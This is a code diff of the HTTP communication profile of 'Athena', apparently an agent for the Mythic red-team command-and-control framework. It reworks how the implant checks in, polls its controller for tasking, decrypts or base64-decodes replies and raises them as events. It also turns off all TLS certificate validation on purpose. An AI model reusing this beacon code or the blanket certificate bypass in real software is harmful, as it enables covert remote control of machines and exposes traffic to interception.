@@ -35,7 +35,7 @@ namespace Athena.Profiles.HTTP
         private HttpClient client { get; set; }
         public DateTime killDate { get; set; }
         private CancellationTokenSource cts = new CancellationTokenSource();
-        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
+        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
 
         public HTTP()
         {
@@ -61,11 +61,7 @@ namespace Athena.Profiles.HTTP
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             //Might need to make this configurable
-            ServicePointManager.ServerCertificateValidationCallback =
-                   new RemoteCertificateValidationCallback(
-                        delegate
-                        { return true; }
-                    );
+            handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator;
 
             if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
             {
@@ -104,25 +100,21 @@ namespace Athena.Profiles.HTTP
 
             //%CUSTOMHEADERS%
         }
-        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        public async Task<bool> Checkin(Checkin checkin)
         {
             int maxAttempts = 3;
             int currentAttempt = 0;
+
             do
             {
-                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
-
-                if (!string.IsNullOrEmpty(res))
+                if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                 {
-                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                    return true;
                 }
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
 
-            return new CheckinResponse()
-            {
-                status = "failed"
-            };
+            return false;
         }
         public async Task StartBeacon()
         {
@@ -146,28 +138,14 @@ namespace Athena.Profiles.HTTP
                     responses = responseTask.Result,
                     rpfwd = rpFwdTask.Result,
                 };
+
                 try
                 {
-                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
-
-                    if (String.IsNullOrEmpty(responseString))
+                    if(!await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking)))
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Beacon attempt failed");
                         this.currentAttempt++;
-                        continue;
                     }
-
-                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    if (gtr == null)
-                    {
-                        this.currentAttempt++;
-                        continue;
-                    }
-
-                    this.currentAttempt = 0;
-
-                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-
-                    this.SetTaskingReceived(this, tra);
                 }
                 catch (Exception e)
                 {
@@ -183,10 +161,10 @@ namespace Athena.Profiles.HTTP
         }
         public bool StopBeacon()
         {
-            cts.Cancel();
+            this.cts.Cancel();
             return true;
         }
-        internal async Task<string> Send(string json)
+        internal async Task<bool> Send(string json)
         {
             try
             {
@@ -214,26 +192,36 @@ namespace Athena.Profiles.HTTP
                 }
 
                 Debug.WriteLine($"[{DateTime.Now}] Got Response with code: {response.StatusCode}");
+                if (!response.IsSuccessStatusCode)
+                {
+                    return false;
+                }
 
                 string strRes = await response.Content.ReadAsStringAsync();
 
+                if (string.IsNullOrEmpty(strRes))
+                {
+                    return false;
+                }
+
                 if (this.encrypted)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
-                    return this.crypt.Decrypt(strRes);
+                    strRes = this.crypt.Decrypt(strRes);
                 }
-
-                if (!string.IsNullOrEmpty(strRes))
+                else
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
-                    return (await Misc.Base64Decode(strRes)).Substring(36);
+                    strRes = Misc.Base64Decode(strRes);
+                    strRes = strRes.Substring(36);
                 }
 
-                return String.Empty;
+                MessageReceivedArgs mra = new MessageReceivedArgs(strRes);
+                this.SetMessageReceived(this, mra);
+
+                return true;
             }
             catch
             {
-                return String.Empty;
+                return false;
             }
         }
     }
